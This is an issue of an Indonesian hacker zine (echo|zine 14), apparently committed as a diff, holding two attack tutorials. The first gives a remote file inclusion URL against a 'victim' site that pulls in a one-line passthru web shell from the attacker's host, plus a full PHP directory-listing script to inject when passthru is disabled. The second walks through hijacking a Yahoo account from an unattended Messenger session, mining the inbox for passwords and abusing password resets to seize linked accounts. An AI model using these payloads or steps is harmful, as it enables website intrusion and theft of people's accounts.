@@ -1,0 +1,201 @@
+
+
+                           echo|zine, issue 14                            
+
+---------------------------[ Hackers Logbook ]----------------------------
+--------------------------------------------------------------------------
+-------------------------------[ various ]--------------------------------
+
+
+
+--------------------------[ Tips PHP Injection ]--------------------------
+-----------------------------[ XBOX360LIVE ]------------------------------
+
+Sudah banyak artikel2 yang membahas PHP injection. Salah satu command yang
+sering dipergunakan dalam aksi 'php injection' adalah 'ls -al' untuk melihat
+isi direktori.
+
+Seperti misalnya:
+	http://www.korban.com/index.php?page=http://www.situsku.com/cmd.txt&?cmd=ls -al
+
+dimana isi dari http://www.situsku.com/cmd.txt adalah
+
+	// begin of cmd.txt
+	<?passthru($_GET[cmd]);?>
+	// end of cmd.txt
+
+Namun, terkadang aksi itu gagal, tidak menghasilkan apapun atau hanya 
+menghasilkan error. Salah satu kemungkinan penyebab kegagalan, fungsi dari
+passthru di'disable' oleh sang admin. Tentunya hal ini dilakukan oleh sang
+admin dengan alasan keamanan. Tapi kita bisa mengakalinya dengan membuat
+script untuk melihat isi direktori.
+
+Berikut script yang penulis modifikasi dari php manual:
+
+// begining of list.txt
+<?php
+
+function lookdir($mydirectory) {
+$strdir = array();
+chdir($mydirectory);
+echo "<br><br>Directory of $mydirectory ";
+if($handle = opendir($mydirectory)) {
+   while (false !== ($file = readdir($handle))) {
+
+	$perms = fileperms($file);
+	if (($perms & 0xC000) == 0xC000) {
+           // Socket
+	   $info = 's';
+	} elseif (($perms & 0xA000) == 0xA000) {
+           // Symbolic Link
+	   $info = 'l';
+	} elseif (($perms & 0x8000) == 0x8000) {
+	   // Regular
+	   $info = '-';
+	} elseif (($perms & 0x6000) == 0x6000) {
+	   // Block special
+	   $info = 'b';
+	} elseif (($perms & 0x4000) == 0x4000) {
+	   // Directory
+	  $info = 'd';
+	  if ($file != ".") {
+	    if ($file != "..") {
+	       $strdir[] = $mydirectory . $file;//preg_replace('/\/./','/',$file);
+	    }   
+	  }
+	  //return $strdir;
+	} elseif (($perms & 0x2000) == 0x2000) {
+	  // Character special
+	  $info = 'c';
+	} elseif (($perms & 0x1000) == 0x1000) {
+	  // FIFO pipe
+	  $info = 'p';
+	} else {
+	  // Unknown
+	  $info = 'u';
+	}
+
+
+	// Owner
+	$info .= (($perms & 0x0100) ? 'r' : '-');
+	$info .= (($perms & 0x0080) ? 'w' : '-');
+	$info .= (($perms & 0x0040) ?
+			(($perms & 0x0800) ? 's' : 'x' ) :
+			(($perms & 0x0800) ? 'S' : '-'));
+
+	// Group
+	$info .= (($perms & 0x0020) ? 'r' : '-');
+	$info .= (($perms & 0x0010) ? 'w' : '-');
+	$info .= (($perms & 0x0008) ?
+			(($perms & 0x0400) ? 's' : 'x' ) :
+			(($perms & 0x0400) ? 'S' : '-'));
+
+	// World
+	$info .= (($perms & 0x0004) ? 'r' : '-');
+	$info .= (($perms & 0x0002) ? 'w' : '-');
+	$info .= (($perms & 0x0001) ?
+			(($perms & 0x0200) ? 't' : 'x' ) :
+			(($perms & 0x0200) ? 'T' : '-'));
+
+
+	$array_file_owner = posix_getpwuid(fileowner($file));
+	$array_file_group = posix_getgrgid(filegroup($file));
+	
+	$info .= " " . $array_file_owner['name'] . " ";
+	$info .= $array_file_group['name'] . " ";
+	$info .= filesize($file) . " ";
+	$info .= date("M d Y",filemtime($file)) . " ";
+	$info .= $file;
+
+	echo "<br> $info";
+       }
+   closedir($handle);
+}
+return $strdir;
+} // end of function lookdir
+
+$my_working_directory = getcwd();
+lookdir($my_working_directory); // atau coba juga lookdir(".");
+
+?>
+// end of list.txt
+
+
+Saat kita coba inject dengan menggunakan list.txt, misalnya:
+
+	http://www.korban.com/index.php?page=http://www.situsku.com/list.txt
+
+akan menghasilkan isi direktori berikut permissionnya.
+
+Tidak rapih memang, tapi tujuan kita untuk melihat isi direktori bisa
+tercapai. Dengan fungsi fread,frwrite kita juga bisa membaca dan
+menulis/membuat sebuah file.
+
+Silahkan dikembangkan.
+
+
+
+                                                                          
+
+-------------[ Takeover Yahoo! Account atau account lainnya ]-------------
+-------------------[ Spyro Kid <spyro_zone@yahoo.com> ]-------------------
+
+Artikel ini akan memaparkan kepada anda tentang kecerobohan-kecerobohan 
+yang sering terjadi dikalangan para netter. Kita akan memanfaatkan beberapa
+kebiasaan buruk yang sering kali dilakukan untuk mengambil alih account 
+mereka tanpa menggunakan tools apapun seperti exploit atau keylogger.
+
+Sebagai contoh adalah penggunaan Yahoo! Messenger dengan kondisi korban
+memberi mengaktifkan opsi Remember My ID & Password atau korban lupa 
+tidak melakukan Sign Out 
+
+Permasalahan yang ditemukan adalah
+- Bagaimana cara mengetahui karakter dibalik simbol bintang pada form
+  password? 
+- Bagaimana cara mendapakan account-account lain yang berhubungan dengan 
+  si korban? 
+
+Sebagai ilustrasi, perhatikan screenshot berikut:
+
+	http://www.freewebtown.com/spyro_zone/ym_ready.JPG
+
+Yahoo ID dan Password sudah di depan mata. Tapi passwordnya tertutup 
+karakter bintang. Menyalin passwordnya ke Text Editor tidak dapat dilakukan
+karena Form Password tidak mengizinkan aksi tersebut. Lalu bagaimana? 
+
+Berikut langkah-langkah yang sebaiknya anda lakukan (atau SEBAIKNYA 
+TIDAK ANDA LAKUKAN): 
+- Sign In saja dengan ID dan Password yang telah terisi itu. 
+- Setelah berhasil klik tab Over View yang dimiliki YM lalu klik 2x 
+  pada sub menu Yahoo Mail. 
+
+	http://www.freewebtown.com/spyro_zone/oview1.bmp
+	http://www.freewebtown.com/spyro_zone/oview2.bmp
+
+Akan muncul kotak Popup konfirmasi yang menanyakan apakah anda ingin 
+otomatis Login ke Yahoo Mail. Klik Yes & Yes pada kotak konfirmasi kedua.
+
+Nah kini Yahoo Mail Korban juga terbuka di hadapan anda dengan indahnya.
+Jangan keburu senang dulu, jelajahi inbox korban. Cari info-info menarik. 
+
+Ketik keyword Account atau Password pada form search mail. Jika anda
+beruntung, maka email yang berisi informasi Account lain sang korban akan
+ditampilkan. Jelajahi email-email sensitif tersebut. Jika anda menemukan
+sebuah email yang berisi Username dan Password, catat passwordnya. Biasanya
+user malas akan memakai password yang sama untuk setiap accountnya. Dan kini
+semua account korban sudah jadi milik anda.
+
+Anda tidak menemukan email berisi Username dan Password? Jelajahi email
+korban. Apakah dia bergabung dengan newsgroup, forum atau situs tertentu.
+Misalnya anda menemukan bahwa korban adalah angota Friendster. Segera arahkan
+Browser anda menuju situs Friendster lalu pilih opsi Forgot Password dan
+isikan alamat email korban di sana. Tunggu beberapa saat dan Friendster akan
+mengirimkan password si korban kepada anda. Dan kini, sperti yang saya katakan
+tadi bahwa biasanya user malas akan memakai password yang sama untuk semua
+accountnya. Maka (hehehe.. lagi-lagi saya katakan) anda telah memiliki kuasa
+penuh atas (hampir) semua accountnya. 
+
+Hal seperti diatas juga dapat anda terapkan ketika si korban lupa melakukan
+sign out. Sangat mudah bukan, dan hasilnya cukup luar biasa. Bisakah anda
+bayangkan jika si korban memiliki account paypal? Atau mungkin si korban
+adalah webmaster suatu situs? 
